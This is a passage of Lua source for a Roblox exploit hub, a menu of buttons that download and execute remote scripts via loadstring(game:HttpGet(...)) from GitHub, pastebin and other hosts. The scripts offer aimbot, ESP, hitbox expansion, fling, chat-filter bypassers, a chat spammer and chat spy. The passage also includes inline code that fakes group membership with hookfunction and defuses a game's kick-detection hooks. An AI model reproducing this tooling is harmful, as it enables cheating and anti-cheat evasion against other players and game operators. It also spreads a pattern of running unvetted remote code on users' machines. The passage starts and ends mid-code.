    vu1:Notification("Notification", "DTI-GUI-V2 Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Ben\'s RNG"):Button("Enable Auto-Pull-Lever", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Ben\'s-RNG-Auto-Pull-Lever-17556"))("t.me/arceusxscripts")
    vu1:Notification("Notification", "Auto-Pull-Lever Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Fabled Legacy"):Button("Enable NS HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/FL/main/Solara"))()
    vu1:Notification("Notification", "NS HUB Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Drive World"):Button("Enable Angel HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/QP-Community/Roblox/main/DriveWorld"))()
    vu1:Notification("Notification", "Angel HUB Activated", "Okay!")
end)
local v81 = v3:Server("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 MISC", "rbxassetid://16270356407")
local v82 = v81:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 SELF-Character")
v82:Textbox("FOV Changer", "Type Number", true, function(p83)
    game.Workspace.CurrentCamera.FieldOfView = p83
    print(p83)
end)
v82:Textbox("Speed Changer", "Type Number", true, function(p84)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = p84
    print(p84)
end)
v82:Textbox("JumpPower Changer", "Type Number", true, function(p85)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = p85
    print(p85)
end)
v82:Textbox("HipHeight Changer", "Type Number", true, function(p86)
    game.Players.LocalPlayer.Character.Humanoid.HipHeight = p86
    print(p86)
end)
v82:Textbox("Gravity Changer", "Type Number", true, function(p87)
    game.Players.LocalPlayer.Character.HumanoidRootPart.Gravity = p87
    print(p87)
end)
v82:Textbox("Changes Zoom Camera {BETA}", "Type Number", true, function(p88)
    game.Workspace.CurrentCamera.CameraMaxZoomDistance = p88
    print(p88)
end)
v82:Textbox("FPS UNLOCKER", "Type Number", true, function(p89)
    setfpscap = p89
    print(p89)
end)
local v90 = v81:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 INFO")
v90:Label("EXECUTOR: " .. identifyexecutor())
v90:Label("Time: " .. os.date("Time: %I:%M:%S %p") .. "]\n [" .. os.date("Today\'s Date: %A | %B %d, %Y") .. "]")
v90:Label("CREDIT XORA")
v90:Label("MORE INFO COMING SOON")
local v91 = v81:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 LOCAL")
v91:Slider("Fov Changer", 70, 120, 70, function(p92)
    game.Workspace.CurrentCamera.FieldOfView = p92
end)
v91:Slider("Speed Changer", 1, 1000, 1, function(p93)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = p93
end)
v91:Slider("Jumppower Changer", 1, 1000, 1, function(p94)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = p94
end)
v91:Button("inf jump", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Infinite%20Jump.txt"))()
    vu1:Notification("Notification", "inf jump  Activated!", "Okay!")
end)
v91:Button("Enable GroupBypasser", function()
    hookfunction(game.Players.LocalPlayer.IsInGroup, function()
        return true
    end)
    vu1:Notification("Notification", "GroupBypaser Activated!", "Okay!")
end)
v91:Button("Enable Server-Hop ", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua"))():Teleport(game.PlaceId)
    vu1:Notification("Notification", "ServerHop Activated!", "Okay!")
end)
v91:Button("Enable Rejoin ", function()
    local v95 = game:GetService("TeleportService")
    local v96 = game:GetService("Players").LocalPlayer
    v95:Teleport(game.PlaceId, v96)
    vu1:Notification("Notification", "rejoin Activated!", "Okay!")
end)
v91:Button("Enable Low player / Low ping server", function()
    local v97 = "ping"
    local vu98 = game:GetService("HttpService")
    local v99, v100 = pcall(function()
        return vu98:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. tostring(game.PlaceId) .. "/servers/Public?limit=100")).data
    end)
    if v99 then
        local v101 = v100[1]
        local v102, v103, v104 = pairs(v100)
        while true do
            local v105
            v104, v105 = v102(v103, v104)
            if v104 == nil then
                break
            end
            if v105[v97] < v101[v97] then
                v101 = v105
            end
        end
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, v101.id)
        vu1:Notification("Notification", "Low player / Low ping server Activated!", "Okay!")
    end
end)
v91:Button("Enable FlyingV3 Gui", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
    vu1:Notification("Notification", "Fly Script Activated!", "Okay!")
end)
v91:Button("Enable Universal Fly", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/gaz0U0XX"))()
    vu1:Notification("Notification", "Universal Script Activated!", "Okay!")
end)
v91:Button("Enable Mobile FLY HD ADMIN", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TakeModzz/Ignore-00000/main/Ignore"))()
    vu1:Notification("Notification", "Mobile FLY HD ADMIN Activated!", "Okay!")
end)
v91:Button("Enable Auto-Jump", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/vViq08jX"))()
    vu1:Notification("Notification", "Auto-Jump Activated!", "Okay!")
end)
v91:Button("Enable AntiFling", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Linux6699/DaHubRevival/main/AntiFling.lua"))()
    vu1:Notification("Notification", "AntiFling Activated!", "Okay!")
end)
v91:Button("Enable kawaii_freaky_fling", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/KAWAII-FREAKY-FLING/main/kawaii_freaky_fling.lua", true))("More scripts: t.me/arceusxscripts")
    vu1:Notification("Notification", "kawaii_freaky_fling Activated!", "Okay!")
end)
v91:Button("Enable ESP", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/ESPSCRIPT/main/ESPSCRIPT", true))()
    vu1:Notification("Notification", "ESP Script Activated!", "Okay!")
end)
v91:Button("Enable ESP(ADVANCED)", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/iv9qAHZP"))()
    vu1:Notification("Notification", "ESP Script Activated!", "Okay!")
end)
v91:Button("Enable ESP(Esp With Toggle OrionLib)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/espuniversalv/main/espuniversalv"))()
    vu1:Notification("Notification", "ESP Script Activated!", "Okay!")
end)
v91:Button("Enable Keyboard Script", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
    vu1:Notification("Notification", "Keyboard Activated!", "Okay!")
end)
v91:Button("Enable BetterKeyboard", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/X8keCiWA", true))()
    vu1:Notification("Notification", "BetterKeyboard Activated!", "Okay!")
end)
v91:Button("Enable KeyboardV3", function()
    loadstring(game:HttpGet("https://pastefy.ga/QNqILuWb/raw", true))()
    vu1:Notification("Notification", "KeyboardV3 Activated!", "Okay!")
end)
v91:Button("Enable Keyboard(USEFUL FOR SCRIPTS REQUIRE A BIND)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FreezyWare/Roblox/main/utility/Keyboard.lua"))()
    vu1:Notification("Notification", "keyboard Activated!", "Okay!")
end)
v91:Button("Enable Delta keyboard", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt", true))()
    vu1:Notification("Notification", "Delta keyboard Activated!", "Okay!")
end)
v91:Button("Enable Shift-Lock", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ronniefx/RonnieShiftLock/1bc0cbc3d5d60854f0c63c2a53e0ae253fc7a7b0/shiftlockmadebyronnie", true))()
    vu1:Notification("Notification", "Shift-lock Activated!", "Okay!")
end)
v91:Button("Enable Right-Click", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/main/RightClick"))()
    vu1:Notification("Notification", "Right-Click Activated!", "Okay!")
end)
v91:Button("Enable Aimbot N ESP (PC)", function()
    loadstring(game:HttpGet("https://gitlab.com/te4224/Scripts/-/raw/main/Universal%20Aimbot%20N%20Esp/v2/main.lua"))()
    vu1:Notification("Notification", "Aimbot N ESP Activated!", "Okay!")
end)
v91:Button("Enable Aimbot N ESP (PC-AIRHUB)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/AirHub/main/AirHub.lua"))()
    vu1:Notification("Notification", "Aimbot N ESP Activated!", "Okay!")
end)
v91:Button("Enable rejoin button when kicked", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GGH52lan/GGH52lan/main/Rejoin_Button.txt"))()
    vu1:Notification("Notification", "rejoin button when kicked Activated!", "Okay!")
end)
v91:Button("Enable Anti-AFK", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/ANTIAFK/main/ANTIAFK", true))()
    vu1:Notification("Notification", "Anti-AFK Activated!", "Okay!")
end)
v91:Button("Enable Anti-AFK REMASTERED", function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Anti-Afk-Remastered-Script-or-Diffrent-Cool-UI-2097"))()
    vu1:Notification("Notification", "Anti-AFK Activated!", "Okay!")
end)
v91:Button("Enable Anti-AFK(ADVANCED)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringypVvhJBq4QNz", true))()
    vu1:Notification("Notification", "Anti-AFK Activated!", "Okay!")
end)
v91:Button("Enable B-TOOLS", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/BTOOLS/main/BTOOLS", true))()
    vu1:Notification("Notification", "B-TOOLS Activated!", "Okay!")
end)
v91:Button("Enable Chat-Spy", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/chatspy/main/chatspy", true))()
    vu1:Notification("Notification", "Chat-Spy Activated!", "Okay!")
end)
v91:Button("Enable player joined/left", function()
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    game.Players.ChildAdded:Connect(function(p106)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = p106.Name,
            Text = "has joined the server. .\n[AGE: " .. p106.AccountAge .. "]",
            Icon = "http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userName=" .. p106.Name .. "&RAND" .. math.random(1, 100000000),
            Duration = 5
        })
    end)
    game.Players.ChildRemoved:Connect(function(p107)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = p107.Name,
            Text = "has left the server. .\n[AGE: " .. p107.AccountAge .. "]",
            Icon = "http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userName=" .. p107.Name .. "&RAND" .. math.random(1, 100000000),
            Duration = 5
        })
    end)
    vu1:Notification("Notification", "Player/Joined/left Activated!", "Okay!")
end)
v91:Button("Enable Punch Fling", function()
    loadstring(game:HttpGet("http://pastefy.app/GvnHVjT5/raw", true))()
    vu1:Notification("Notification", "Punch Fling Activated!", "Okay!")
end)
v91:Button("Enable Anti-LagV2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Script/main/Anti-lag-V2.lua", true))()
    vu1:Notification("Notification", "Anti-Lag Activated!", "Okay!")
end)
v91:Button("Enable Anti-Lag(VIKICHARD)", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Anti-lag-in-tsb-script-CREDITS-TO-VIKICHARD-HES-A-W-15272"))("t.me/arceusxscripts")
    vu1:Notification("Notification", "Anti-Lag Activated!", "Okay!")
end)
v91:Button("Enable Chat BETA", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/rqwEN7QF", true))()
    vu1:Notification("Notification", "Chat Beta Activated!", "Okay!")
end)
v91:Button("Enable Chat-Bypass", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ChainGotStucked/a55af82d82574/main/REAL_MENACE"))()
    vu1:Notification("Notification", "Chat-Bypass Activated!", "Okay!")
end)
v91:Button("Enable Chat-Bypass(MRCBV4LSB4KRS)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BakaPraselol/MRCBV4LSB4KRS/main/Loader"))()
    vu1:Notification("Notification", "Chat-Bypass Activated!", "Okay!")
end)
v91:Button("Enable Chat-Bypass", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/chatbypass/main/chatbypass", true))()
    vu1:Notification("Notification", "Chat-Bypass Activated!", "Okay!")
end)
v91:Button("Enable simple bypass(Chat Bypasser)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SkireScripts/Ouxie/main/Projects/simplebypass.lua"))()
    vu1:Notification("Notification", "simple bypass Activated!", "Okay!")
end)
v91:Button("Enable UserCreation{KeySystem-Key:royal}", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1price/usercreation/main/UserCreation.lua", true))()
    vu1:Notification("Notification", "UserCreation Activated!", "Okay!")
end)
v91:Button("Enable Chat-Bypass(8/25/24)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/chatbypasser/main/chatbypasser", true))()
    vu1:Notification("Notification", "Chat-Bypass Activated!", "Okay!")
end)
v91:Button("Enable BetterBypasser(OP-NEW)", function()
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua"))()
    vu1:Notification("Notification", "BetterBypasser Activated!", "Okay!")
end)
v91:Button("Enable KAWAII-BYPASS", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/KAWAII-BYPASS/main/kawaii-bypass", true))("t.me/arceusxscripts")
    vu1:Notification("Notification", "KAWAII-BYPASS Activated!", "Okay!")
end)
v91:Button("Enable EpicBypasser V4", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BigBoyTimme/My.Scripts/refs/heads/main/EpicBypassed.Updates/_Version_4"))()
    vu1:Notification("Notification", "EpicBypasser V4 Activated!", "Okay!")
end)
v91:Button("Enable Anti Chat Logger", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/Wqxzdi1q"))()
    vu1:Notification("Notification", "Anti-Chat-logger Activated!", "Okay!")
end)
v91:Button("Enable Anti Chat Logger2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua", true))()
    vu1:Notification("Notification", "Anti-Chat-logger Activated!", "Okay!")
end)
v91:Button("Enable Chat-spammer", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/chatspammer/main/chatspammer", true))()
    vu1:Notification("Notification", "Chat-spammer Activated!", "Okay!")
end)
v91:Button("Enable More Inventory Slots-mobile5lots", function()
    getgenv().slots = 11
    loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/uwuware/main/Kustom/mobile5lots", false))("More scripts: t.me/arceusxscripts")
    vu1:Notification("Notification", "Hitbox Expander Activated!", "Okay!")
end)
v91:Button("Enable Hitbox Expander", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/RobloxScripts/main/HitboxExpander.lua", true))()
    vu1:Notification("Notification", "Hitbox Expander Activated!", "Okay!")
end)
v91:Button("Enable Expand Hitbox", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/timurgim/CheatS/refs/heads/main/ExpandHitboxRBLX", true))()
    vu1:Notification("Notification", "Expand Hitbox Activated!", "Okay!")
end)
v91:Button("Enable Fake-lag", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/VM3b0Thg"))()
    vu1:Notification("Notification", "Fake Lag Activated!", "Okay!")
end)
v91:Button("Enable FPS BOOSTER", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/fpsbooster/main/fpsbooster", true))()
    vu1:Notification("Notification", "FPS BOOSTER Activated!", "Okay!")
end)
v91:Button("Enable adonis bypass", function()
    loadstring(game:HttpGet("https://github.com/Pixeluted/adoniscries/blob/main/Source.lua"))()
    vu1:Notification("Notification", "adonis bypass Activated!", "Okay!")
end)
v91:Button("Enable Bypass LagBacks", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/bypasslagback/main/bypasslag", true))()
    vu1:Notification("Notification", "Bypass LagBacks Activated!", "Okay!")
end)
v91:Button("Enable Bypass-Functions-detection-hooks", function()
    local v108 = next
    local v109, v110 = getgc(true)
    while true do
        local vu111
        v110, vu111 = v108(v109, v110)
        if v110 == nil then
            break
        end
        local function v113(pu112)
            if pcall(function()
                return rawget(vu111, pu112)
            end) and (typeof(rawget(vu111, pu112)) == "table" and rawget(vu111, pu112)[1] == "kick") then
                vu111.tvk = {
                    "kick",
                    function()
                        return game.Workspace:WaitForChild("")
                    end
                }
            end
        end
        v113("indexInstance")
        v113("namecallInstance")
    end
    vu1:Notification("Notification", "Bypass-Functions-detection-hooks Activated!", "Okay!")
end)
v91:Button("Enable Universal Radar", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/UNIVERALRADAR/main/UNIVERALRADAR", true))()
    vu1:Notification("Notification", "Universal Radar Activated!", "Okay!")
end)
v91:Button("Enable Freecam_mobile", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Script/main/Freecam_mobile.lua", true))()
    vu1:Notification("Notification", "Freecam_mobile Activated!", "Okay!")
end)
v91:Button("Enable Stream Sniper(FFJ HUB)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Sniper.lua"))()
    vu1:Notification("Notification", "Stream Sniper(FFJ HUB) Activated!", "Okay!")
end)
v91:Button("Enable Sword Reach", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/0dnNLQgG"))()
    vu1:Notification("Notification", "Sword Reach Activated!", "Okay!")
end)
v91:Button("Enable Auto Piano V3", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MADNESSTEST/iq8if/main/owodjjb.lua", true))()
    vu1:Notification("Notification", "Auto Piano V3 Activated!", "Okay!")
end)
v91:Button("Enable Weapon Range Change(Reach GUI)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/etotspia5/Reach-v5.0/main/Reach%20V5.0"))()
    vu1:Notification("Notification", "eapon Range Change Activated!", "Okay!")
end)
v91:Button("Enable TP-WALKV4", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheRealXORA/Roblox/Scripts/Tpwalk%20V4%20%5B%20BETA%20%5D.lua", true))()
    vu1:Notification("Notification", "TP-WALKV4 Activated", "Okay!")
end)
v91:Button("Enable TP-WALK(Scarlet)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scarlet1837/a/main/Tpwalk"))("More scripts: t.me/arceusxscripts")
    vu1:Notification("Notification", "TP-WALK(Scarlet) Activated", "Okay!")
end)
v91:Button("Enable FPS BOOST TEXTURE PACK", function()
    local v114 = game
    local v115 = v114.Workspace
    local v116 = v114.Lighting
    local v117 = v115.Terrain
    v117.WaterWaveSize = 0
    v117.WaterWaveSpeed = 0
    v117.WaterReflectance = 0
    v117.WaterTransparency = 0
    v116.GlobalShadows = false
    v116.FogEnd = 9000000000
    v116.Brightness = 0
    settings().Rendering.QualityLevel = "Level01"
    local v118, v119, v120 = pairs(v114:GetDescendants())
    local v121 = true
    while true do
        local v122
        v120, v122 = v118(v119, v120)
        if v120 == nil then
            break
        end
        if v122:IsA("Part") or (v122:IsA("Union") or (v122:IsA("CornerWedgePart") or v122:IsA("TrussPart"))) then
            v122.Material = "Plastic"
            v122.Reflectance = 0
        elseif v122:IsA("Decal") or v122:IsA("Texture") and v121 then
            v122.Transparency = 1
        elseif v122:IsA("ParticleEmitter") or v122:IsA("Trail") then
            v122.Lifetime = NumberRange.new(0)
        elseif v122:IsA("Explosion") then
            v122.BlastPressure = 1
            v122.BlastRadius = 1
        elseif v122:IsA("Fire") or (v122:IsA("SpotLight") or v122:IsA("Smoke")) then
            v122.Enabled = false
        elseif v122:IsA("MeshPart") then
            v122.Material = "Plastic"
            v122.Reflectance = 0
            v122.TextureID = 1.0385902758728956e16
        end
    end
    local v123, v124, v125 = pairs(v116:GetChildren())
    while true do
        local v126
        v125, v126 = v123(v124, v125)
        if v125 == nil then
            break
        end
        if v126:IsA("BlurEffect") or (v126:IsA("SunRaysEffect") or (v126:IsA("ColorCorrectionEffect") or (v126:IsA("BloomEffect") or v126:IsA("DepthOfFieldEffect")))) then
            v126.Enabled = false
        end
    end
    vu1:Notification("Notification", " FPS BOOST TEXTURE PACK Activated!", "Okay!")
end)
v91:Button("Enable Full-Bright", function()
    if not _G.FullBrightExecuted then
        _G.FullBrightEnabled = false
        local v127 = _G
        local v128 = {
            Brightness = game:GetService("Lighting").Brightness,
            ClockTime = game:GetService("Lighting").ClockTime,
            FogEnd = game:GetService("Lighting").FogEnd,
            GlobalShadows = game:GetService("Lighting").GlobalShadows,
            Ambient = game:GetService("Lighting").Ambient
        }
        v127.NormalLightingSettings = v128
        game:GetService("Lighting"):GetPropertyChangedSignal("Brightness"):Connect(function()
            if game:GetService("Lighting").Brightness ~= 1 and game:GetService("Lighting").Brightness ~= _G.NormalLightingSettings.Brightness then
                _G.NormalLightingSettings.Brightness = game:GetService("Lighting").Brightness
                if not _G.FullBrightEnabled then
                    repeat
                        wait()
                    until _G.FullBrightEnabled
                end
                game:GetService("Lighting").Brightness = 1
            end
        end)
        game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(function()
            if game:GetService("Lighting").ClockTime ~= 12 and game:GetService("Lighting").ClockTime ~= _G.NormalLightingSettings.ClockTime then
                _G.NormalLightingSettings.ClockTime = game:GetService("Lighting").ClockTime
                if not _G.FullBrightEnabled then
                    repeat
                        wait()
                    until _G.FullBrightEnabled
                end
                game:GetService("Lighting").ClockTime = 12
            end
        end)
        game:GetService("Lighting"):GetPropertyChangedSignal("FogEnd"):Connect(function()
            if game:GetService("Lighting").FogEnd ~= 786543 and game:GetService("Lighting").FogEnd ~= _G.NormalLightingSettings.FogEnd then
                _G.NormalLightingSettings.FogEnd = game:GetService("Lighting").FogEnd
                if not _G.FullBrightEnabled then
                    repeat
                        wait()
                    until _G.FullBrightEnabled
                end
                game:GetService("Lighting").FogEnd = 786543
            end
        end)
        game:GetService("Lighting"):GetPropertyChangedSignal("GlobalShadows"):Connect(function()
            if game:GetService("Lighting").GlobalShadows ~= false and game:GetService("Lighting").GlobalShadows ~= _G.NormalLightingSettings.GlobalShadows then
                _G.NormalLightingSettings.GlobalShadows = game:GetService("Lighting").GlobalShadows
                if not _G.FullBrightEnabled then
                    repeat
                        wait()
                    until _G.FullBrightEnabled
                end
                game:GetService("Lighting").GlobalShadows = false
            end
        end)
        game:GetService("Lighting"):GetPropertyChangedSignal("Ambient"):Connect(function()
            if game:GetService("Lighting").Ambient ~= Color3.fromRGB(178, 178, 178) and game:GetService("Lighting").Ambient ~= _G.NormalLightingSettings.Ambient then
                _G.NormalLightingSettings.Ambient = game:GetService("Lighting").Ambient
                if not _G.FullBrightEnabled then
                    repeat
                        wait()
                    until _G.FullBrightEnabled
                end
                game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
            end
        end)
        game:GetService("Lighting").Brightness = 1
        game:GetService("Lighting").ClockTime = 12
        game:GetService("Lighting").FogEnd = 786543
        game:GetService("Lighting").GlobalShadows = false
        game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
        local vu129 = true
        spawn(function()
            repeat
                wait()
            until _G.FullBrightEnabled
            while wait() do
                if _G.FullBrightEnabled ~= vu129 then
                    if _G.FullBrightEnabled then
                        game:GetService("Lighting").Brightness = 1
                        game:GetService("Lighting").ClockTime = 12
                        game:GetService("Lighting").FogEnd = 786543
                        game:GetService("Lighting").GlobalShadows = false
                        game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
                    else
                        game:GetService("Lighting").Brightness = _G.NormalLightingSettings.Brightness
                        game:GetService("Lighting").ClockTime = _G.NormalLightingSettings.ClockTime
                        game:GetService("Lighting").FogEnd = _G.NormalLightingSettings.FogEnd
                        game:GetService("Lighting").GlobalShadows = _G.NormalLightingSettings.GlobalShadows
                        game:GetService("Lighting").Ambient = _G.NormalLightingSettings.Ambient
                    end
                    vu129 = not vu129
                end
            end
        end)
    end
    _G.FullBrightExecuted = true
    _G.FullBrightEnabled = not _G.FullBrightEnabled
    vu1:Notification("Notification", "Full-Bright Activated!", "Okay!")
end)
v91:Button("Enable Roblox Audio Logger", function()
    aa = game:GetObjects("rbxassetid://01997056190")[1]
    aa.Parent = game.CoreGui
    wait(0.2)
    GUI = aa.PopupFrame.PopupFrame
    pos = 0
    ignore = {
        "rbxasset://sounds/action_get_up.mp3",
        "rbxasset://sounds/uuhhh.mp3",
        "rbxasset://sounds/action_falling.mp3",
        "rbxasset://sounds/action_jump.mp3",
        "rbxasset://sounds/action_jump_land.mp3",
        "rbxasset://sounds/impact_water.mp3",
        "rbxasset://sounds/action_swim.mp3",
        "rbxasset://sounds/action_footsteps_plastic.mp3"
    }
    GUI.Close.MouseButton1Click:connect(function()
        GUI:TweenSize(UDim2.new(0, 360, 0, 0), "Out", "Quad", 0.5, true)
        wait(0.6)
        GUI.Parent:TweenSize(UDim2.new(0, 0, 0, 20), "Out", "Quad", 0.5, true)
        wait(0.6)
        aa:Destroy()
    end)
    local vu130 = false
    GUI.Minimize.MouseButton1Click:connect(function()
        if vu130 ~= false then
            GUI:TweenSize(UDim2.new(0, 360, 0, 260), "Out", "Quad", 0.5, true)
            vu130 = false
        else
            GUI:TweenSize(UDim2.new(0, 360, 0, 20), "Out", "Quad", 0.5, true)
            vu130 = true
        end
    end)
    function printTable(p131)
        if type(p131) ~= "table" then
            return nil
        end
        local vu132 = - 15
        local function vu138(p133, _)
            vu132 = vu132 + 15
            local v134, v135, v136 = pairs(p133)
            while true do
                local v137
                v136, v137 = v134(v135, v136)
                if v136 == nil then
                    break
                end
                if type(v137) ~= "table" then
                    GUI.Store.Text = GUI.Store.Text .. "\n" .. string.rep(" ", vu132) .. " [" .. tostring(v136) .. "] = " .. tostring(v137)
                    wait()
                else
                    GUI.Store.Text = GUI.Store.Text .. "\n" .. string.rep(" ", vu132) .. " [" .. tostring(v136) .. "] = {"
                    vu138(v137, false)
                    wait()
                end
            end
            vu132 = vu132 - 15
        end
        vu138(p131, true)
    end
    function refreshlist()
        pos = 0
        GUI.Logs.CanvasSize = UDim2.new(0, 0, 0, 0)
        local v139, v140, v141 = pairs(GUI.Logs:GetChildren())
        while true do
            local v142
            v141, v142 = v139(v140, v141)
            if v141 == nil then
                break
            end
            v142.Position = UDim2.new(0, 0, 0, pos)
            GUI.Logs.CanvasSize = UDim2.new(0, 0, 0, pos + 20)
            pos = pos + 20
        end
    end
    function FindTable(p143, p144)
        local v145, v146, v147 = pairs(p143)
        while true do
            local v148
            v147, v148 = v145(v146, v147)
            if v147 == nil then
                break
            end
            if v148 == p144 then
                return true
            end
        end
        return false
    end
    function writefileExploit()
        if writefile then
            return true
        end
    end
    writeaudio = {}
    running = false
    GUI.SS.MouseButton1Click:connect(function()
        if writefileExploit() then
            if running == false then
                GUI.Load.Visible = true
                running = true
                GUI.Load:TweenSize(UDim2.new(0, 360, 0, 20), "Out", "Quad", 0.5, true)
                wait(0.3)
                local v149, v150, v151 = pairs(GUI.Logs:GetChildren())
                while true do
                    local v152
                    v151, v152 = v149(v150, v151)
                    if v151 == nil then
                        break
                    end
                    if v152:FindFirstChild("ImageButton") and v152:FindFirstChild("ImageButton").BackgroundTransparency == 0 then
                        writeaudio[# writeaudio + 1] = {
                            NAME = v152.NAME.Value,
                            ID = v152.ID.Value
                        }
                    end
                end
                GUI.Store.Visible = true
                printTable(writeaudio)
                wait(0.2)
                local vu153 = 0
                local function vu156()
                    local vu154 = nil
                    pcall(function()
                        vu154 = readfile("Audios" .. vu153 .. ".txt")
                    end)
                    if vu154 then
                        vu153 = vu153 + 1
                        vu156()
                    else
                        local v155 = tostring(GUI.Store.Text):gsub("\n", "\r\n")
                        writefile("Audios" .. vu153 .. ".txt", v155)
                    end
                end
                vu156()
                local v157 = vu153
                for _ = 1, 10 do
                    GUI.Load.BackgroundTransparency = GUI.Load.BackgroundTransparency + 0.1
                    wait(0.05)
                end
                GUI.Load.Visible = false
                GUI.Load.BackgroundTransparency = 0
                GUI.Load.Size = UDim2.new(0, 0, 0, 20)
                running = false
                GUI.Store.Visible = false
                GUI.Store.Text = ""
                writeaudio = {}
                game:FindService("StarterGui"):SetCore("SendNotification", {
                    Title = "Audio Logger",
                    Text = "Saved audios\n(Audios" .. v157 .. ".txt)",
                    Icon = "http://www.roblox.com/asset/?id=176572847",
                    Duration = 5
                })
            end
        else
            game:FindService("StarterGui"):SetCore("SendNotification", {
                Title = "Audio Logger",
                Text = "Exploit cannot writefile :(",
                Icon = "http://www.roblox.com/asset/?id=176572847",
                Duration = 5
            })
        end
    end)
    GUI.SA.MouseButton1Click:connect(function()
        if writefileExploit() then
            if running == false then
                GUI.Load.Visible = true
                running = true
                GUI.Load:TweenSize(UDim2.new(0, 360, 0, 20), "Out", "Quad", 0.5, true)
                wait(0.3)
                local v158, v159, v160 = pairs(GUI.Logs:GetChildren())
                while true do
                    local v161
                    v160, v161 = v158(v159, v160)
                    if v160 == nil then
                        break
                    end
                    writeaudio[# writeaudio + 1] = {
                        NAME = v161.NAME.Value,
                        ID = v161.ID.Value
                    }
                end
                GUI.Store.Visible = true
